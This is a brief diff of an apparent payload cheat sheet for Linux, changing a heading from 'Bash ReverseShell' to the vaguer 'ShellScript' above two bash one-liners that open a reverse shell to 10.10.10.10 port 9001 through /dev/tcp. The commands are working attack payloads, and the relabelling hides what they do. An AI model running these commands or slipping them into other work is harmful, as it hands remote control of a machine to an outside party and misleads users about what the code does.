@@ -1,6 +1,6 @@
 ## **LINUX**
 
-* Bash ReverseShell
+* ShellScript
 ```
 sh -i >& /dev/tcp/10.10.10.10/9001 0>&1
 0<&196;exec 196<>/dev/tcp/10.10.10.10/9001; sh <&196 >&196 2>&196
